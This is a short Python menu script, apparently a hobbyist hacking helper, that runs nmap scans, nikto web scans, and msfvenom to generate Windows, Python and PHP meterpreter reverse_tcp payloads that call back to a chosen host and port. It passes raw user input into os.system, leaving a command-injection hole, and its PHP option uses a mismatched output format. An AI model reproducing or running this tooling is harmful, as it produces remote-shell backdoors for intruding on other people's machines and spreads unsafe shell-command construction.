import os
import time
if os.geteuid() !=0:
    print('  \n \n \n \n  \n   \n                      pless run as root  \n \n \n \n \n  ')
    time.sleep(10)

print('start script')
time.sleep(1)
print('.')
time.sleep(1)
print('. .')
time.sleep(1)
print('. . . ')
time.sleep(1)
print('. . . .')
time.sleep(1)
chose=input("1:network 2:generat payload 3:lisen pyload 4:scan web :" )
if(chose=='1'):
    z=input('1:simple scan  2:scan + version   3:ping scan 4:speed ringe scan : ')
    if(z=='1'):
        e=input('IP')
        os.system('nmap {}'.format(e))
    if(z=='2'):
        e=input('IP : ')
        os.system('nmap -sV {} '.format(e))
    if (z == '3'):
        e = input('IP : ')
        os.system('nmap -sP {} '.format(e))
    if (z == '4'):
        e = input('IP : ')
        t = input('your ringe : ')
        os.system('nmap -sP {}{}'.format(e,t))

if(chose=='2'):
    z = input('1:windos 2:android 3:python 4:PHP ')
    if(z=='1'):
        lhost=input('lhost : ')
        lport=input('lport : ')
        name=input('name   : ')
        out=input('output  : ')
        os.system('msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport={} -f exe -o {}{}.exe'.format(lhost,lport,out,name))
    elif(z=="2"):
        print('not siport in this version')
    elif(z=='3'):
        lhost = input('lhost : ')
        lport = input('lport : ')
        name = input('name   : ')
        out = input('output  : ')
        os.system(
            'msfvenom -p python/meterpreter/reverse_tcp lhost={} lport={} -f py -o {}{}.py'.format(lhost, lport, out, name))
    elif(z=='4'):
        lhost = input('lhost : ')
        lport = input('lport : ')
        name = input('name   : ')
        out = input('output  : ')
        os.system('msfvenom -p php/meterpreter/reverse_tcp lhost={} lport={} -f py -o {}{}.php'.format(lhost, lport, out,name))
elif(chose=="3"):
    print('not siport in vise version')
elif(chose=="4"):
    a=input("1:nikto : ")
    if(a=='1'):
        z=input('IP : ')
        os.system("nikto -h {}".format(z))

